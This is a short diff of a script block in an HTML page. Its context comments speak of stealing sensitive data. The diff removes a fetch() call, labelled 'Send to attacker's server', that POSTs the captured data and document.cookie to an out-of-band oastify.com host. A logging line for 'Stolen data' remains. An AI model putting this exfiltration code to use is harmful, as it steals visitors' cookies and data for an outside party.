@@ -36,17 +36,7 @@
         // Steal sensitive data
         console.log('Stolen data:', data);
 
-        // Send to attacker's server
-        fetch('https://8nwxthjzmfpdsfokfbmkausjlar1fs3h.oastify.com', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json'
-          },
-          body: JSON.stringify({
-            victim_data: data,
-            cookies: document.cookie
-          })
-        });
+     
 
       });
   </script>
